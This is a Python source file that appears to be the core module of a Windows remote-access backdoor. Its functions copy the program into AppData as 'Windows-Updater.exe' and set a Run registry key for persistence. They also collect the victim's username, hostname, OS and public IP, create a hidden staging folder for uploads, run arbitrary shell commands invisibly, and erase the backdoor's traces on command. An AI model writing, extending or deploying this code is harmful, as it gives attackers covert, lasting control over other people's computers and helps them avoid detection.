import os
import subprocess as sp
import shutil
import sys
from urllib.request import Request, urlopen
import random
import platform

def addPersistence():
    backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
    if os.path.exists(backdoor_location):
        return "already-enabled"
    try:
        shutil.copyfile(sys.executable, backdoor_location)
        sp.call(
            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',
            shell=True)
        return "enabled"
    except Exception as e:
        return f"error: {e}"

def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception:
        USERNAME = "None"
    return USERNAME

def getHostname():
    try:
        HOSTNAME = platform.node()
    except Exception:
        HOSTNAME = "None"
    return HOSTNAME

def getOS():
    try:
        OS = platform.platform()
    except Exception:
        OS = "None"
    return OS

def getIP():
    try:
        IP = urlopen(Request("https://ipv4.myip.wtf/text")).read().decode().strip()
    except Exception:
        IP = "None"
    return IP

def id():
    path = fr"C:\Users\{getUsername()}\.config\ID"
    
    def createID(file):
        ID = file.read()
        if ID == "":
            ID = random.randint(1, 10000)
            file.write(str(ID))
        return ID
    try:    
        with open(path, "r+") as IDfile:
            return createID(IDfile)

    except Exception:
        with open(path, "w+") as IDfile:
            return createID(IDfile)

def createConfig():
    try:
        path = fr'"C:\Users\{getUsername()}\.config"'
        new_path = path[1:]
        new_path = new_path[:-1]
        os.mkdir(new_path)
        os.system(f"attrib +h {path}")
        path = fr'C:\Users\{getUsername()}\.config\uploads'
        os.mkdir(path)
        return True

    except WindowsError as e:
        if e.winerror == 183:
            return False

def cmd(command):
    result = sp.Popen(command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,
                        text=True, creationflags=0x08000000)
    out, err = result.communicate()
    result.wait()
    if not err:
        return out
    else:
        return err

def selfdestruct():
    try:
        update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
        if os.path.exists(update_location):
            os.remove(update_location)
        sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
        return True

    except Exception as e:
        return e